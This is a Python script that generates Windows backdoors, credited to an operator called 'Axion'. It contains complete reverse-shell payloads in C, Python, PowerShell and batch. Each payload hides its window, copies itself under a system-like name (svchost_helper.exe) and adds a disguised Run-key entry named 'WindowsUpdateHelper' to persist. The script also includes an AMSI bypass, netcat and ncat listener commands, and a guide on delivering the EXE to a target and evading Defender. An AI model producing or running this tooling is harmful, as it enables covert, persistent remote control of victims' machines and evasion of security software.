#!/usr/bin/env python3
"""
Windows Reverse Shell Backdoor Generator — Professional v3
Operator: Axion

Features:
  - Single self-contained C payload that:
      * connects with reconnect loop
      * hides console
      * installs itself to %APPDATA%\\Microsoft\\Windows\\svchost_helper.exe
      * adds HKCU Run persistence under a benign name
  - PowerShell / BAT / Python variants still available
  - Dynamic IP / no static IP support via tunnel or VPS
  - Clear usage for home <-> office control
"""

import argparse
import base64
import os
import sys
import textwrap

def generate_c_payload(lhost, lport, persist_name="WindowsUpdateHelper"):
    code = f'''#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define LHOST "{lhost}"
#define LPORT {lport}
#define PERSIST_NAME "{persist_name}"

void hide_console(void) {{
    FreeConsole();
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}}

int install_persistence(void) {{
    char src[MAX_PATH];
    char dest[MAX_PATH];
    char appdata[MAX_PATH];
    HKEY hKey;
    char value[MAX_PATH + 32];

    if (!GetModuleFileNameA(NULL, src, MAX_PATH)) return 0;
    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) return 0;

    snprintf(dest, MAX_PATH, "%s\\\\Microsoft\\\\Windows\\\\svchost_helper.exe", appdata);

    CreateDirectoryA(appdata, NULL);
    char mid[MAX_PATH];
    snprintf(mid, MAX_PATH, "%s\\\\Microsoft", appdata);
    CreateDirectoryA(mid, NULL);
    snprintf(mid, MAX_PATH, "%s\\\\Microsoft\\\\Windows", appdata);
    CreateDirectoryA(mid, NULL);

    CopyFileA(src, dest, FALSE);

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
        snprintf(value, sizeof(value), "\\"%s\\"", dest);
        RegSetValueExA(hKey, PERSIST_NAME, 0, REG_SZ, (BYTE*)value, (DWORD)(strlen(value) + 1));
        RegCloseKey(hKey);
    }}
    return 1;
}}

int main(void) {{
    hide_console();
    install_persistence();

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    while (1) {{
        s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET) {{
            Sleep(8000);
            continue;
        }}

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(LHOST);
        server.sin_port = htons(LPORT);

        if (connect(s, (struct sockaddr *)&server, sizeof(server)) != 0) {{
            closesocket(s);
            Sleep(8000);
            continue;
        }}

        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        if (CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }}

        closesocket(s);
        Sleep(5000);
    }}

    WSACleanup();
    return 0;
}}
'''
    return code


def generate_python_payload(lhost, lport):
    code = f'''import socket
import subprocess
import os
import time
import sys
import ctypes
import shutil

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def persist():
    try:
        src = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        appdata = os.environ.get("APPDATA", "")
        if not appdata:
            return
        dest_dir = os.path.join(appdata, "Microsoft", "Windows")
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, "svchost_helper.exe" if getattr(sys, "frozen", False) else "svchost_helper.py")
        try:
            shutil.copy2(src, dest)
        except Exception:
            pass
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        cmd = f'"{{dest}}"' if dest.endswith(".exe") else f'pythonw.exe "{{dest}}"'
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

def connect():
    hide_console()
    persist()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(12)
            s.connect(("{lhost}", {lport}))
            s.settimeout(None)
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            try:
                subprocess.call(["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-C", "cmd.exe"])
            except Exception:
                subprocess.call(["cmd.exe", "/c", "cmd.exe"])
            s.close()
        except Exception:
            time.sleep(9)
            continue

if __name__ == "__main__":
    connect()
'''
    return code


def generate_powershell_payload(lhost, lport, encoded=False):
    raw = f'''$ErrorActionPreference="SilentlyContinue"
$client=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream=$client.GetStream()
[byte[]]$bytes=0..65535|%{{0}}
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{
    $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback=(iex $data 2>&1 | Out-String)
    $sendback2=$sendback + "PS " + (pwd).Path + "> "
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()'''
    if encoded:
        b64 = base64.b64encode(raw.encode("utf-16le")).decode()
        return f'powershell -nop -w hidden -enc {{b64}}'.format(b64=b64)
    return raw


def generate_powershell_amsi_bypass_payload(lhost, lport):
    amsi = '''$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);'''
    shell = generate_powershell_payload(lhost, lport, encoded=False)
    return amsi + "\\n" + shell


def generate_batch_wrapper(lhost, lport):
    enc_cmd = generate_powershell_payload(lhost, lport, encoded=True)
    return "@echo off\n" + enc_cmd + "\n" 


def generate_persistence_ps(lhost, lport):
    enc = generate_powershell_payload(lhost, lport, encoded=True)
    code = f'''# Persistence - current-user Run key
$cmd = '{enc}'
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdateHelper" -Value $cmd -PropertyType String -Force | Out-Null
Write-Host "[+] Persistence added under HKCU Run as WindowsUpdateHelper"
'''
    return code


def generate_listener_helper(lport):
    return textwrap.dedent(f'''
# Listener options on your attacker machine

# Classic
nc -lvnp {lport}

# Preferred
ncat -lvnp {lport}

# socat
socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash

# After connection you receive an interactive shell.
''')


def generate_usage_md(lhost, lport):
    return textwrap.dedent(f'''
# Windows Backdoor — Professional Usage Guide (Axion)

## 1. Generate

```bash
python3 generate_backdoor.py --lhost YOUR_IP_OR_TUNNEL_HOST --lport {lport} --type all
```

## 2. Compile the professional single EXE (recommended)

```bash
x86_64-w64-mingw32-gcc -o win_backdoor.exe backdoor_payloads/win_backdoor.c -lws2_32 -mwindows -s -O2
```

This single EXE:
- Hides its window
- Copies itself to %APPDATA%\\\\Microsoft\\\\Windows\\\\svchost_helper.exe
- Adds HKCU Run key "WindowsUpdateHelper"
- Reconnects every ~8 seconds
- Spawns hidden cmd.exe

One file. Run once. Persistence automatic.

## 3. Listener

```bash
ncat -lvnp {lport}
```

## 4. Delivery

Copy EXE to target and run once. Shell appears. Persistence already done.

## 5. No static IP / home controlling office

Residential IPs change. Use:

A) Cheap VPS with static IP (most professional)
   - Run ncat permanently on the VPS
   - Generate payload with VPS IP
   - Control from anywhere via SSH/tmux to the VPS

B) Free/cheap TCP tunnel service that gives you a public host:port
   - Point --lhost at the tunnel hostname
   - Payload only connects outbound — office IP changes do not matter

C) Cloudflare Tunnel (good for HTTP, more work for raw TCP reverse shells)

Never depend on your home residential IP.

## 6. Why Defender blocked the old .ps1

PowerShell + encoded reverse shell + Run key = heavily signatured.
Solution: use the compiled C EXE. It never drops a .ps1.

## 7. Further reducing detections

- Compile with -s -O2
- Rename EXE (svchost_helper.exe, RuntimeBroker.exe, etc.)
- Change PERSIST_NAME / path strings and recompile
- Let it install to AppData then delete the original dropper
- Use non-default high ports

## 8. Professional workflow

1. Stable endpoint (VPS or TCP tunnel)
2. Generate + compile C payload pointing at it
3. Deliver single EXE, run once
4. Persistence + hidden + reconnect automatic
5. Control from anywhere
''')


def main():
    parser = argparse.ArgumentParser(description="Windows Backdoor Generator Professional v3 — Axion")
    parser.add_argument("--lhost", required=True, help="Listener IP or tunnel hostname")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--type", choices=["python", "powershell", "c", "all"], default="all")
    parser.add_argument("--outdir", default="backdoor_payloads")
    parser.add_argument("--amsi", action="store_true", help="Add simple AMSI bypass to PS payload")
    parser.add_argument("--persist-name", default="WindowsUpdateHelper", help="Run key name")
    args = parser.parse_args()

    os.makedirs(args.outdir, exist_ok=True)

    print(f"[+] Generating professional payloads for {args.lhost}:{args.lport}")
    print(f"[+] Output: {args.outdir}")

    if args.type in ["python", "all"]:
        path = os.path.join(args.outdir, "win_backdoor.py")
        with open(path, "w") as f:
            f.write(generate_python_payload(args.lhost, args.lport))
        print(f"[+] Python: {path}")
        print("    Build: pyinstaller --onefile --noconsole --name svchost_helper win_backdoor.py")

    if args.type in ["powershell", "all"]:
        if args.amsi:
            ps = generate_powershell_amsi_bypass_payload(args.lhost, args.lport)
            print("[+] AMSI bypass included in PS")
        else:
            ps = generate_powershell_payload(args.lhost, args.lport)
        with open(os.path.join(args.outdir, "win_backdoor.ps1"), "w") as f:
            f.write(ps)
        print(f"[+] PowerShell: {args.outdir}/win_backdoor.ps1")

        with open(os.path.join(args.outdir, "win_backdoor.bat"), "w") as f:
            f.write(generate_batch_wrapper(args.lhost, args.lport))
        print(f"[+] Batch: {args.outdir}/win_backdoor.bat")

        with open(os.path.join(args.outdir, "add_persistence.ps1"), "w") as f:
            f.write(generate_persistence_ps(args.lhost, args.lport))
        print(f"[+] Persistence helper: {args.outdir}/add_persistence.ps1")

    if args.type in ["c", "all"]:
        path = os.path.join(args.outdir, "win_backdoor.c")
        with open(path, "w") as f:
            f.write(generate_c_payload(args.lhost, args.lport, args.persist_name))
        print(f"[+] C source (professional single-file): {path}")
        print("    Compile:")
        print("      x86_64-w64-mingw32-gcc -o win_backdoor.exe win_backdoor.c -lws2_32 -mwindows -s -O2")

    with open(os.path.join(args.outdir, "LISTENER.txt"), "w") as f:
        f.write(generate_listener_helper(args.lport))
    print(f"[+] Listener notes: {args.outdir}/LISTENER.txt")

    with open(os.path.join(args.outdir, "USAGE.md"), "w") as f:
        f.write(generate_usage_md(args.lhost, args.lport))
    print(f"[+] Full guide: {args.outdir}/USAGE.md")

    print("\\n[+] Done. Prefer the compiled C EXE — one file, auto-persist, reconnect.")
    print("[+] For dynamic IP / office control use a VPS or TCP tunnel as --lhost.")


if __name__ == "__main__":
    main()
